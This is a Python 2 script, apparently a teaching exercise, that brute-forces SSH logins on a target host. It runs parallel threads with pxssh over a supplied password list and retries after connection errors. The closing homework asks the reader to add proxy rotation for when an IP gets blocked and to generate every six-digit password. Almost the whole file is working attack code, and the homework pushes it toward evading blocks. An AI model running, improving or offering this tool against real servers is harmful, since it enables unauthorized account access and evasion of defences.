from pexpect import pxssh
from threading import *
import optparse
import time

'''
This code we need learning pxssh from pexpect
Docstring:
----------
    1. first,we create maxConnection to set max number of threads. This example we set 5
    2. we set global variable Found and Fails
        Found: check any thread finds the correct password, if found, Found = True else false
        Fails: Number of failed in "timeout Error"
    3. we try connect with target ssh use password list,if find error between "read_nonblocking" and
        "synchronize with original prompt" then, we need set time.sleep(1) and try again !

Note:
-----
    1. we threading code write for loop, that means:
        when we have many many password,
        If the previous thread finds it, 
        then the following thread does not need to look up.
    2.if thread have so many Fails(this example is 5),then exit and
        we need check target computer or yourself computer.
        

'''

maxConnection = 5
connection_lock = BoundedSemaphore(value=maxConnection)
Found = False
Fails = 0


def connect(host, user, password):

    '''

    :param host: target host
    :param user: target user
    :param password: target passwrod
    :return: None

    '''
    global Found, Fails
    try:
        s = pxssh.pxssh()  # create an instance
        s.login(host, user, password)  # login
        print '[+] Password Found: ' + password
        Found = True
    except Exception as e:
        if 'read_nonblocking' in str(e):
            print '[!] found read_nonblocking will be restart '
            Fails += 1
            time.sleep(1)
            connect(host, user, password)
        elif 'synchronize with original prompt' in str(e):
            print '[!] found synchronize will be restart '
            time.sleep(1)
            connect(host, user, password)


def main():
    '''
    Start run function
    '''
    parser = optparse.OptionParser('usage%prog ' +
                                   '-H <target host> -u <user> -F <password list>')
    parser.add_option('-H', dest='tgtHost', type='string', help='specify target host')
    parser.add_option('-u', dest='user', type='string', help='specify target user')
    parser.add_option('-F', dest='passwordList', type='string', help='specify password list')

    (options, args) = parser.parse_args()

    host = options.tgtHost
    passwordList = options.passwordList
    user = options.user
    if (host is None) or (passwordList is None) or (user is None):
        print parser.usage
        exit(0)

    passwordList = passwordList.split(',')

    for password in passwordList:
        if Found:
            print '[*] Exiting: Password Found'
            exit(0)
        if Fails > 5:
            print '[!] Exiting: Too many socket timeout'
            exit(0)
        t = Thread(target=connect, args=(host, user, password))
        t.start()
        print '[-] Testing password {} with {}'.format(password, t.getName())


if __name__ == '__main__':
    main()

'''
HomeWork:
    0. read this code,
    1. add "change ip proxy function" if ip was blocked. means add "ip error" in except
    2. alter password to passFile,means read password from file.you can use following code:
        ["".join(x) for x in itertools.product("0123456789", repeat=6)])
        friendly reminder:
            you need use generator in Python, else your computer will be die! :) 
    Good Luck ~
'''
